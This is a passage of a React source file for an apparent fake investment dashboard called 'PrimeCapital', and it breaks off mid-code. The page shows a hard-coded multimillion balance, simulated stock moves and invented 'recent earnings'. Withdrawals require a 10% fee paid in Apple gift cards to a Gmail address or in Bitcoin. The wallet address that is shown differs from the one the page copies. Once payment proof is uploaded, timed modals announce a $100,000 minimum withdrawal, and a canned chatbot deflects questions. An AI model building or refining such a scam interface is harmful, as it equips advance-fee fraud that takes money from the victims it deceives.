'use client';
import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import Footer from '@/components/Footer';
import Confetti from 'react-confetti';

export default function DashboardPage() {
  const router = useRouter();
  const [userName, setUserName] = useState('Najee');
  const [totalBalance] = useState('$2,673,302.00');
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [showAllTransactions, setShowAllTransactions] = useState(false);
  const [showCardDetails, setShowCardDetails] = useState(false);
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('');
  const [showConfetti, setShowConfetti] = useState(false);
  const [showUploadModal, setShowUploadModal] = useState(false);
  const [uploadedFile, setUploadedFile] = useState([]);
  const [uploadError, setUploadError] = useState("");

  const [windowSize, setWindowSize] = useState({
    width: typeof window !== 'undefined' ? window.innerWidth : 0,
    height: typeof window !== 'undefined' ? window.innerHeight : 0,
  });
  const [transferForm, setTransferForm] = useState({
    bank: '',
    accountNumber: '',
    routingNumber: '',
    accountName: '',
    amount: ''
  });
  const [showCopyConfirmation, setShowCopyConfirmation] = useState(false);
  const [copyConfirmationText, setCopyConfirmationText] = useState('');
  const [hasCopiedDetails, setHasCopiedDetails] = useState(false);
  const [showWarning, setShowWarning] = useState(false);
  const [showBalanceWarning, setShowBalanceWarning] = useState(false);
  const [showPendingModal, setShowPendingModal] = useState(false);
  const [showWithdrawalModal, setShowWithdrawalModal] = useState(false);
  const [showTransferOptionsModal, setShowTransferOptionsModal] = useState(false);
  const [showOnlineBankModal, setShowOnlineBankModal] = useState(false);
  const [showPrepaidCardModal, setShowPrepaidCardModal] = useState(false);
  const [showCashAppModal, setShowCashAppModal] = useState(false);
  const [showChatBot, setShowChatBot] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [interactionCount, setInteractionCount] = useState(0);
  const [showLocationModal, setShowLocationModal] = useState(true);

  const americanBanks = [
    'JPMorgan Chase',
    'Bank of America',
    'Chime Bank',
    'Go2 Bank',
    'Stockman Bank',
    'OnPoint Community Credit Union',
    'Wells Fargo',
    'Citibank',
    'U.S. Bank',
    'Truist Bank',
    'PNC Bank',
    'TD Bank',
    'Capital One',
    'Sofi Bank',
    'Goldman Sachs Bank',
    'Morgan Stanley Bank',
    'American Express Bank',
    'Discover Bank',
    'Ally Bank',
    'USAA Bank',
    'Navy Federal Credit Union',
    'State Farm Bank',
    'Fifth Third Bank',
    'Regions Bank'
  ];

  const canadianBanks = [
    'Royal Bank of Canada',
    'Toronto-Dominion Bank',
    'Bank of Nova Scotia',
    'Bank of Montreal',
    'Canadian Imperial Bank of Commerce',
    'National Bank of Canada',
    'HSBC Bank Canada',
    'Laurentian Bank of Canada',
    'Equitable Bank',
    'Manulife Bank of Canada',
    'Canadian Western Bank',
    'Tangerine Bank',
    'Simplii Financial',
    'Home Trust Company',
    'ATB Financial',
    'Alterna Bank',
    'Motusbank',
    'Coast Capital Savings',
    'First Nations Bank of Canada',
    'VersaBank',
  ]

  const banks = [
    'NatWest',
    'Deutsche Bank',
    'Commerzbank',
    'DZ Bank',
    'KfW Bankengruppe',
    'Unicredit Bank AG (HypoVereinsbank)',
    'Landesbank Baden-Württemberg (LBBW)',
    'BayernLB',
    'NordLB',
    'Helaba',
    'Hamburger Sparkasse (Haspa)',
    'Volksbanken Raiffeisenbanken',
    'Sparkassen-Finanzgruppe',
    'Berliner Sparkasse',
    'Stadtsparkasse München',
    'Frankfurter Sparkasse',
    'N26',
    'Revolut',
    'DKB',
    'ING-DiBa',
    'Comdirect'
  ];

  useEffect(() => {
    if (showUploadModal) {
      setUploadedFile([]);
      setUploadError("");
    }
  }, [showUploadModal]);
  
  const [stocks, setStocks] = useState([
    { symbol: 'AAPL', price: 185.64, change: 2.34, changePercent: 1.28 },
    { symbol: 'MSFT', price: 420.72, change: -1.23, changePercent: -0.29 },
    { symbol: 'GOOGL', price: 152.45, change: 3.12, changePercent: 2.09 },
    { symbol: 'AMZN', price: 180.75, change: 1.45, changePercent: 0.81 },
    { symbol: 'META', price: 485.96, change: -2.15, changePercent: -0.44 },
  ]);

  const [recentEarnings, setRecentEarnings] = useState([
    { name: 'Alex M.', amount: 1250, time: '2 mins ago', type: 'Stocks' },
    { name: 'Sarah K.', amount: 875, time: '5 mins ago', type: 'Crypto' },
    { name: 'James L.', amount: 2100, time: '8 mins ago', type: 'Real Estate' },
    { name: 'Emma R.', amount: 450, time: '12 mins ago', type: 'Forex' },
    { name: 'Michael T.', amount: 1680, time: '15 mins ago', type: 'Commodities' },
  ]);

  const [currentEarningIndex, setCurrentEarningIndex] = useState(0);
  const [isTransitioning, setIsTransitioning] = useState(false);

  const names = [
    'Alex', 'Sarah', 'James', 'Emma', 'Michael', 'David', 'Lisa', 'John', 'Anna', 'Robert',
    'William', 'Elizabeth', 'Thomas', 'Jennifer', 'Charles', 'Susan', 'Joseph', 'Margaret', 'Daniel', 'Karen',
    'Matthew', 'Nancy', 'Anthony', 'Betty', 'Mark', 'Sandra', 'Donald', 'Ashley', 'Steven', 'Kimberly'
  ];

  const [transactions] = useState([
    { type: 'Deposit', amount: 50000, date: 'Jan 15, 2024', status: 'Completed', source: 'Coinbase' },
    { type: 'Investment', amount: -200000, date: 'Jan 10, 2024', status: 'Completed', source: 'Tesla' },
    { type: 'Wired Check', amount: 75000, date: 'Jan 8, 2024', status: 'Completed', source: 'Google' },
    { type: 'Deposit', amount: 120000, date: 'Jan 5, 2024', status: 'Completed', source: 'Microsoft' },
    { type: 'Investment', amount: -150000, date: 'Jan 3, 2024', status: 'Completed', source: 'Amazon' },
    { type: 'Wired Check', amount: 90000, date: 'Dec 28, 2023', status: 'Completed', source: 'Facebook' },
    { type: 'Deposit', amount: 60000, date: 'Dec 25, 2023', status: 'Completed', source: 'Coinbase' },
    { type: 'Investment', amount: -180000, date: 'Dec 20, 2023', status: 'Completed', source: 'Tesla' },
    { type: 'Wired Check', amount: 110000, date: 'Dec 15, 2023', status: 'Completed', source: 'Google' },
  ]);

  const inputRef = useRef(null);

  useEffect(() => {
    // Check if user is logged in
    const isLoggedIn = localStorage.getItem('isLoggedIn');
    if (!isLoggedIn) {
      router.push('/login');
    }

    // Simulate live stock price changes
    const stockInterval = setInterval(() => {
      setStocks(prevStocks => 
        prevStocks.map(stock => {
          const randomChange = (Math.random() - 0.5) * 2;
          const newPrice = stock.price + randomChange;
          const newChange = randomChange;
          const newChangePercent = (newChange / stock.price) * 100;
          return {
            ...stock,
            price: Number(newPrice.toFixed(2)),
            change: Number(newChange.toFixed(2)),
            changePercent: Number(newChangePercent.toFixed(2))
          };
        })
      );
    }, 3000);

    // Simulate new earnings with transitions
    const earningsInterval = setInterval(() => {
      setIsTransitioning(true);
      setTimeout(() => {
        setCurrentEarningIndex(prev => (prev + 1) % recentEarnings.length);
        setIsTransitioning(false);
      }, 500);
    }, 2000);

    const handleResize = () => {
      setWindowSize({
        width: window.innerWidth,
        height: window.innerHeight,
      });
    };

    window.addEventListener('resize', handleResize);
    return () => {
      clearInterval(stockInterval);
      clearInterval(earningsInterval);
      window.removeEventListener('resize', handleResize);
    };
  }, [router, recentEarnings.length]);

  const handleLogout = () => {
    localStorage.removeItem('isLoggedIn');
    localStorage.removeItem('userEmail');
    router.push('/login');
  };

  const handleTransferMoneyClick = () => {
    setShowTransferOptionsModal(true);
  };

  const handleTransferSubmit = (e) => {
    e.preventDefault();
    setShowTransferModal(false);
    setShowPaymentModal(true);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    
    // Validation based on field type
    if (name === 'accountName') {
      // Only allow letters and spaces
      if (/^[a-zA-Z\s]*$/.test(value)) {
        setTransferForm({ ...transferForm, [name]: value });
      }
    } else if (name === 'accountNumber') {
      // Only allow numbers, between 10-12 digits
      if (/^\d{0,23}$/.test(value)) {
        setTransferForm({ ...transferForm, [name]: value });
      }
    } else if (name === 'routingNumber') {
      // Only allow numbers, exactly 9 digits
      if (/^\d{0,9}$/.test(value)) {
        setTransferForm({ ...transferForm, [name]: value });
      }
    } else if (name === 'amount') {
      // Only allow numbers and decimal point, max 2 decimal places
      if (/^\d*\.?\d{0,2}$/.test(value)) {
        const amount = parseFloat(value);
        const currentBalance = parseFloat(totalBalance.replace(/[^0-9.-]+/g, ''));
        if (amount > currentBalance) {
          setShowBalanceWarning(true);
        } else {
          setShowBalanceWarning(false);
        }
        setTransferForm({ ...transferForm, [name]: value });
      }
    } else {
      setTransferForm({ ...transferForm, [name]: value });
    }
  };

  const handlePaymentMethodSelect = (method) => {
    setSelectedPaymentMethod(method);
  };


const handleFileUpload = (e) => {
  const file = e.target.files[0];
  if (file) {
    setUploadedFile(file);
  }
};


const handlePaymentConfirmations = () => {
  if (!uploadedFile || uploadedFile.length === 0) {
    setUploadError("Upload payment proof before submitting.");
    return;
  }

  setUploadError(""); // Clear previous error

  // Proceed with modal transitions
  setShowUploadModal(false);
  setShowPendingModal(true);
  setShowPaymentModal(false);

  setTimeout(() => {
    setShowPendingModal(false);
    setShowWithdrawalModal(true);
  }, 20000);
};

  
  
  const calculateFee = () => {
    const amount = parseFloat(transferForm.amount.replace(/[^0-9.-]+/g, ''));
    return (amount * 0.10).toFixed(2);
  };

  const copyToClipboard = (text, type) => {
    navigator.clipboard.writeText(text);
    setCopyConfirmationText(type === 'giftcard' ? 'Email copied!' : 'Wallet address copied!');
    setShowCopyConfirmation(true);
    setHasCopiedDetails(true);
    setTimeout(() => {
      setShowCopyConfirmation(false);
    }, 2000);
  };

  const formatCardNumber = (number) => {
    return number.replace(/(\d{4})/g, '$1 ').trim();
  };

  const handlePaymentConfirmation = () => {
    if (!hasCopiedDetails && window.getSelection().toString() === '') {
      setShowWarning(true);
      return;
    }
  
    setShowPaymentModal(false);
    setShowPendingModal(true);
    setShowConfetti(true);
  
    // Hide confetti after 5s
    setTimeout(() => {
      setShowConfetti(false);
    }, 5000);
  
    // Show withdrawal modal after 3s
    setTimeout(() => {
      setShowWithdrawalModal(true);
    }, 30000);
  };
  

  const handleTransferOptionSelect = (option) => {
    setShowTransferOptionsModal(false);
    if (option === 'localBank') {
      setShowTransferModal(true);
    } else if (option === 'onlineBank') {
      setShowOnlineBankModal(true);
    } else if (option === 'prepaidBank') {
      setShowPrepaidCardModal(true);
    }
    // Add logic for other options if needed
  };

  const handleSendMessage = () => {
    const userMessage = inputRef.current.value;
    if (userMessage.trim() !== '') {
      setChatMessages([...chatMessages, `User: ${userMessage}`, "Chatbot: Please contact support for further assistance."]);
      inputRef.current.value = '';
      setInteractionCount(interactionCount + 1);
      if (interactionCount >= 2) {
        setInteractionCount(0); // Reset interaction count after two responses
      }
    }
  };

  return (
    <main className="relative min-h-screen">

      {/* Copy Confirmation Toast */}
      {showCopyConfirmation && (
        <div className="fixed bottom-4 right-4 bg-yellow-500 text-black px-4 py-2 rounded-lg shadow-lg z-50 animate-fade-in-out">
          {copyConfirmationText}
        </div>
      )}
      <div 
        className="absolute inset-0 bg-cover bg-center bg-no-repeat bg-fixed"
        style={{ 
          backgroundImage: 'url(/bg.jpg)',
          imageRendering: 'crisp-edges',
          WebkitImageRendering: 'crisp-edges'
        }}
      >
        <div className="absolute inset-0 bg-black/50"></div>
      </div>
      <div className="fixed top-0 left-0 right-0 z-50 p-4 md:px-24 md:py-10 flex justify-between items-center bg-white/10 backdrop-blur-sm shadow-md">
        <div 
          onClick={() => router.push('/')} 
          className="text-white text-2xl cursor-pointer"
        >
          Prime<span className="text-yellow-500">Capital</span>
        </div>
        
        {/* Mobile Hamburger Menu */}
        <button 
          className="md:hidden text-white cursor-pointer"
          onClick={() => setIsMenuOpen(!isMenuOpen)}
        >
          <svg 
            className="w-6 h-6" 
            fill="none" 
            stroke="currentColor" 
            viewBox="0 0 24 24"
          >
            {isMenuOpen ? (
              <path 
                strokeLinecap="round" 
                strokeLinejoin="round" 
                strokeWidth={2} 
                d="M6 18L18 6M6 6l12 12" 
              />
            ) : (
              <path 
                strokeLinecap="round" 
                strokeLinejoin="round" 
                strokeWidth={2} 
                d="M4 6h16M4 12h16M4 18h16" 
              />
            )}
          </svg>
        </button>

        {/* Mobile Menu */}
        <div 
          className={`fixed top-0 right-0 h-full w-64 bg-white/10 backdrop-blur-sm md:hidden transform transition-transform duration-300 ease-in-out ${
            isMenuOpen ? 'translate-x-0' : 'translate-x-full'
          }`}
          style={{ height: '100vh' }}
        >
          <div className="flex flex-col p-6 space-y-6 h-full">
            <div className="flex justify-end">
              <button 
                onClick={() => setIsMenuOpen(false)}
                className="text-white cursor-pointer"
              >
                <svg 
                  className="w-6 h-6" 
                  fill="none" 
                  stroke="currentColor" 
                  viewBox="0 0 24 24"
                >
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M6 18L18 6M6 6l12 12" 
                  />
                </svg>
              </button>
            </div>
            <button 
              onClick={() => {
                router.push('/');
                setIsMenuOpen(false);
              }}
              className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer text-lg"
            >
              Home
            </button>
            <button 
              onClick={() => {
                router.push('/profile');
                setIsMenuOpen(false);
              }}
              className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer text-lg"
            >
              Profile
            </button>
            <button 
              onClick={() => {
                handleLogout();
                setIsMenuOpen(false);
              }}
              className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer text-lg"
            >
              Logout
            </button>
          </div>
        </div>

        {/* Desktop Menu */}
        <div className="hidden md:flex items-center space-x-6">
          <button 
            onClick={() => router.push('/')}
            className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer"
          >
            Home
          </button>
          <button 
            onClick={() => router.push('/profile')}
            className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer"
          >
            Profile
          </button>
          <button 
            onClick={handleLogout}
            className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer"
          >
            Logout
          </button>
        </div>
      </div>

      {/* Recent Earnings Ticker */}
      <div className="fixed top-16 md:relative md:top-28 left-0 right-0 z-40 backdrop-blur-sm py-2 overflow-hidden">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex justify-center">
            <div className={`flex items-center space-x-2 transition-all duration-500 transform ${
              isTransitioning ? 'opacity-0 -translate-y-2' : 'opacity-100 translate-y-0'
            }`}>
              <span className="text-white font-semibold">{recentEarnings[currentEarningIndex].name}</span>
              <span className="text-green-500">+${recentEarnings[currentEarningIndex].amount.toLocaleString()}</span>
              <span className="text-gray-300 text-sm">({recentEarnings[currentEarningIndex].type})</span>
              <span className="text-gray-400 text-sm">{recentEarnings[currentEarningIndex].time}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Transfer Options Modal */}
      {showTransferOptionsModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-white/10 backdrop-blur-lg p-8 rounded-lg max-w-md w-full mx-4">
            <div className="text-center">
              <h3 className="text-xl font-bold text-white mb-4">Select Transfer Option</h3>
              <button
                onClick={() => handleTransferOptionSelect('localBank')}
                className="bg-yellow-500 mb-5 text-black px-6 py-2 rounded-lg hover:bg-yellow-600 transition-colors mb-2 w-full"
              >
                Select country bank
              </button>
              {/* <button
                onClick={() => handleTransferOptionSelect('onlineBank')}
                className="bg-yellow-500 mb-5 text-black px-6 py-2 rounded-lg hover:bg-yellow-600 transition-colors mb-2 w-full"
              >
                Transfer to Your Online Bank
              </button> */}
              <button
                onClick={() => setShowTransferOptionsModal(false)}
                className="mt-4 text-gray-300 hover:text-white transition-colors"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Transfer Money Modal */}
      {showTransferModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md w-full max-w-md">
            <div className="flex justify-between items-center mb-4">
              <button 
                onClick={() => {
                  setShowTransferModal(false);
                  setShowTransferOptionsModal(true);
                  setShowBalanceWarning(false);
                }}
                className="text-white hover:text-yellow-500"
              >
                <svg 
                  className="w-6 h-6" 
                  fill="none" 
                  stroke="currentColor" 
                  viewBox="0 0 24 24"
                >
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M15 19l-7-7 7-7" 
                  />
                </svg>
              </button>
            </div>
            <form onSubmit={handleTransferSubmit} className="space-y-4">
              {/* Bank selection */}
              <div>
                <label htmlFor="bank" className="block text-gray-200 mb-2">
                  Select Bank
                </label>
                <select
                  id="bank"
                  name="bank"
                  value={transferForm.bank}
                  onChange={handleInputChange}
                  required
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
                >
                  <option value="" disabled>— Select a bank —</option>
                  <optgroup label="Other Banks" className='text-lg font-bold'>
                    {banks.map((b) => <option key={b} value={b}>{b}</option>)}
                  </optgroup>
                  <optgroup label="American Banks" className='text-lg font-bold'>
                    {americanBanks.map((b) => <option key={b} value={b}>{b}</option>)}
                  </optgroup>
                  <optgroup label="Canadian Banks" className='text-lg font-bold'>
                    {canadianBanks.map((b) => <option key={b} value={b}>{b}</option>)}
                  </optgroup>
                </select>
              </div>
              <div>
                <label className="block text-gray-200 mb-2">Receipient Name</label>
                <input
                  type="text"
                  name="accountName" 
                  value={transferForm.accountName}
                  onChange={handleInputChange}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
                  placeholder="Enter account name"
                  required
                  pattern="[a-zA-Z\s]*"
                  title="Only letters and spaces are allowed"
                />
              </div>
              <div>
                <label className="block text-gray-200 mb-2">IBAN/Account Number</label>
                <input
                  type="text"
                  name="accountNumber"
                  value={transferForm.accountNumber}
                  onChange={handleInputChange}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
                  placeholder="Enter account number"
                  required
                  pattern="\d{0,23}"
                  title="Only numbers are allowed (0-23 digits)"
                  maxLength="23"
                />
              </div>
              <div>
                <label className="block text-gray-200 mb-2">Routing Number</label>
                <input
                  type="text"
                  name="routingNumber"
                  value={transferForm.routingNumber}
                  onChange={handleInputChange}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
                  placeholder="only for American banks"
                  pattern="\d{9}"
                  title="Only numbers are allowed (9 digits)"
                  maxLength="9"
                />
              </div>
              <div>
                <label className="block text-gray-200 mb-2">Amount</label>
                <input
                  type="text"
                  name="amount"
                  value={transferForm.amount}
                  onChange={handleInputChange}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
                  placeholder="Enter amount"
                  required
                  pattern="\d*\.?\d{0,2}"
                  title="Only numbers and up to 2 decimal places are allowed"
                />
                {showBalanceWarning && (
                  <p className="text-red-500 text-sm mt-1">Amount exceeds your current balance of {totalBalance}</p>
                )}
              </div>
              <button
                type="submit"
                className="w-full bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
                disabled={showBalanceWarning}
              >
                Transfer
              </button>
            </form>
          </div>
        </div>
      )}

      {/* Payment Pending Modal */}
      {showPendingModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-white/10 backdrop-blur-lg p-8 rounded-lg max-w-md w-full mx-4">
            <div className="text-center">
              <div className="w-16 h-16 border-4 border-yellow-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
              <h3 className="text-xl font-bold text-white mb-2">Payment Pending</h3>
              <p className='text-red-600 text-[13px] mb-5'>warning! do not close or refresh this page until payment has fully processed</p>
              <p className="text-gray-300 mb-4">
                We are reviewing your payment. Your account will be credited within 15 minutes after your payment is confirmed.
              </p>
            
            </div>
          </div>
        </div>
      )}
      {showWithdrawalModal && (
        <div className="fixed inset-0 backdrop-blur-xl flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg max-w-md w-full mx-4 shadow-lg text-center">
            <h3 className="text-lg font-semibold text-gray-900 mb-4">
              Important Withdrawal Information
            </h3>
            <p className="text-sm text-gray-700 mb-4">
              This is a premium investment account and the minimum withdrawal on a premium account is 
              <strong className='text-green-600'> $100,000</strong>. Whatever withdrawal fee you 
              paid initially will be added to the minimum withdrawal amount.
            </p>
            <p className='text-sm '>You can send an email to primecapitalorg@gmail.com for further clarification or assistance</p>
            <button
              onClick={() => {
                setShowWithdrawalModal(false);
                setShowPendingModal(false);
              }}
              className="mt-4 px-4 py-2 bg-yellow-500 text-white rounded"
            >
              Proceed to withdrawal
            </button>
          </div>
        </div>
      )}

      {/* Payment Confirmation Modal */}
      {showPaymentModal && (
  <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">

    <div className="bg-white/10 backdrop-blur-sm px-4 md:px-6 rounded-lg shadow-md w-full max-w-md max-h-[90vh] overflow-y-auto">
      <div className="flex justify-between items-center mb-4 sticky top-0 bg-black/80 -mx-4 md:-mx-6 px-4 md:px-6 py-2">
        <h2 className="text-xl font-semibold text-yellow-500">Complete Payment</h2>
        <button
          onClick={() => {
            setShowPaymentModal(false);
            setSelectedPaymentMethod('');
            setHasCopiedDetails(false);
            setShowWarning(false);
          }}
          className="text-white hover:text-yellow-500"
        >
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>
      </div>

      <div className="space-y-4 pb-7 text-sm">
        <div className="bg-white/5 p-3 md:p-4 rounded-lg">
          <p className="text-gray-200 mb-2 text-yellow-500">Receiver Details: </p>
          <div className="space-y-2">
            <p className="text-gray-200">Bank Name: <span className="text-white">{transferForm.bank}</span></p>
            <p className="text-gray-200">Receipient Name: <span className="text-white">{transferForm.accountName}</span></p>
            <p className="text-gray-200">IBAN/Account Number: <span className="text-white">{transferForm.accountNumber}</span></p>
            <p className="text-gray-200">Routing Number: <span className="text-white">{transferForm.routingNumber}</span></p>
            <p className="text-gray-200">Transfer Amount: <span className="text-white">${transferForm.amount}</span></p>
          </div>
        </div>

        <div className="bg-white/5 p-3 md:p-4 rounded-lg">
          <p className="text-gray-200 mb-2 text-yellow-500">Payment Information:</p>
          <div className="space-y-2">
            <p className="text-sm text-gray-300">
              Note: The processing fee is <span className="text-green-500">${(transferForm.amount * 0.1).toFixed(2)}</span> (10%) of your transfer amount and must be paid using one of the payment methods below.
            </p>
          </div>
        </div>

        <div className="space-y-4">
          <div
            className={`p-3 md:p-4 rounded-lg border ${
              selectedPaymentMethod === 'giftcard' ? 'border-yellow-500 bg-yellow-500/10' : 'border-white/10'
            } transition-colors duration-300`}
          >
            <button
              onClick={() => handlePaymentMethodSelect('giftcard')}
              className="w-full flex items-center justify-between"
            >
              <span className="text-white">Pay with Apple GiftCard</span>
              <span className="text-yellow-500">→</span>
            </button>
            
              <div className="mt-4">
                <p className='text-red-500 mb-1'>warning!</p>
                <p className="text-white mb-2">Send giftcards to only the email address below:</p>
                <div className="relative">
                  <div className="flex items-center bg-black/50 rounded">
                    <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">primecapitalorg@gmail.com</code>
                    <button
                      onClick={() => copyToClipboard('primecapitalorg@gmail.com', 'giftcard')}
                      className="p-2 text-yellow-500 hover:text-yellow-400"
                    >
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                      </svg>
                    </button>
                  </div>
                </div>
              </div>
            
          </div>

          <div
            className={`p-3 md:p-4 rounded-lg border ${
              selectedPaymentMethod === 'bitcoin' ? 'border-yellow-500 bg-yellow-500/10' : 'border-white/10'
            } transition-colors duration-300`}
          >
            <button
              onClick={() => handlePaymentMethodSelect('bitcoin')}
              className="w-full flex items-center justify-between"
            >
              <span className="text-white">Pay with Bitcoin</span>
              <span className="text-yellow-500">→</span>
            </button>
            
              <div className="mt-4">
              <p className='text-red-500 mb-1'>warning! </p>
                <p className="text-white mb-2">Send Bitcoin to only the wallet address below:</p>
                <div className="relative">
                  <div className="flex items-center bg-black/50 rounded">
                    <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">bc1qk95swephx3t7cdv9ww20fkfcphxyyr38gl8y9z</code>
                    <button
                      onClick={() => copyToClipboard('bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz', 'bitcoin')}
                      className="p-2 text-yellow-500 hover:text-yellow-400"
                    >
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                      </svg>
                    </button>
                  </div>
                </div>
              </div>
          
          </div>

          {/* <div
  className={`p-3 md:p-4 rounded-lg border ${
    selectedPaymentMethod === 'cashapp' ? 'border-yellow-500 bg-yellow-500/10' : 'border-white/10'
  } transition-colors duration-300`}
>
  <button
    onClick={() => handlePaymentMethodSelect('cashapp')}
    className="w-full flex items-center justify-between"
  >
    <span className="text-white">Pay with CashApp</span>
    <span className="text-yellow-500">→</span>
  </button>

  <div className="mt-4">
    <p className="text-red-500 mb-1">warning!</p>
    <p className="text-white mb-2">Send processing fee to only the CashApp tag below:</p>
    <div className="relative">
      <div className="flex items-center bg-black/50 rounded">
        <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">$rickyblackdog123456</code>
        <button
          onClick={() => copyToClipboard('$rickyblackdog123456', 'cashapp')}
          className="p-2 text-yellow-500 hover:text-yellow-400"
        >
          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
          </svg>
        </button>
      </div>
    </div> */}
  {/* </div> */}
{/* </div> */}

        </div>

        {/* ✅ Unified Upload Screenshot Button */}
        <button
          onClick={() => setShowUploadModal(true)}
          className="w-full mt-6 bg-yellow-500 hover:bg-yellow-700 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
        >
          Upload Payment Screenshot
        </button>
      </div>
    </div>
  </div>
)}

{showUploadModal && (
  <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4">
    <div className="bg-white/10 backdrop-blur-sm rounded-lg p-6 w-full max-w-sm">
      <h3 className="text-lg font-semibold text-yellow-500 mb-2">Upload Screenshot</h3>
      <p className='text-[11.5px] text-white mb-3'>Note: if you made payment using more than one unit of giftcard, take a screenshot of all units and upload at once</p>
      <input
        type="file"
        accept="image/*"
        multiple
        onChange={(e) => {
          setUploadedFile([...e.target.files]); 
          setUploadError("");
        }}
        className="block border-b cursor-pointer text-white text-[12px] mb-1"
      />
      <div className="flex justify-end gap-3 mt-4">
        <button
          onClick={() => setShowUploadModal(false)}
          className="px-4 py-2 bg-yellow-500 text-[12px]  text-black rounded hover:bg-yellow-700 transition"
        >
          Cancel
        </button>
        <button
          onClick={handlePaymentConfirmations}
          className="px-4 py-2 bg-yellow-500 text-[12px] text-black rounded hover:bg-yellow-700 transition"
        >
          Submit
        </button>
      </div>
      {uploadError && (
        <p className="text-red-500 text-center text-[12px] mt-5">{uploadError}</p>
      )}
    </div>
  </div>
)}


      
      <div className="fixed bottom-[5px] right-[10px] z-50">
        <button 
          onClick={() => {
            setShowChatBot(!showChatBot);
            if (!showChatBot) {
              setChatMessages([]);
              setInteractionCount(0);
            }
          }}
          className="text-black rounded-full transition-colors duration-300 animate-bounce"
        >
          <img 
            src="/bot.png" 
            alt="AI Bot" 
            className="w-[150px]"
          />
        </button>
        {showChatBot && (
          <div className="bg-white/10 backdrop-blur-sm p-3 text-[13px] rounded-lg shadow-md w-60 absolute bottom-[60px] right-0">
            <div className="flex justify-between items-center mb-2">
              <h3 className="text-white font-bold">Prime<span className='text-yellow-500'>Chat</span></h3>
              <button 
                onClick={() => setShowChatBot(false)}
                className="text-white hover:text-yellow-500"
              >
                <svg 
                  className="w-5 h-5" 
                  fill="none" 
                  stroke="currentColor" 
                  viewBox="0 0 24 24"
                >
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M6 18L18 6M6 6l-12 12" 
                  />
                </svg>
              </button>
            </div>
            <div className="flex-1 overflow-y-auto">
              {/* Chat messages will go here */}
              <div className="text-gray-300 mb-2">Hello! How can I assist you today?</div>
              {/* Example conversation */}

              {chatMessages.map((msg, index) => (
                <div key={index} className="text-gray-300 mb-2">{msg}</div>
              ))}
            </div>
            <div className="mt-2">
              <input 
                ref={inputRef}
                type="text" 
                placeholder="Type your message..." 
                className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2 text-white focus:outline-none focus:border-yellow-500"
                onKeyDown={(e) => {
                  if (e.key === 'Enter') {
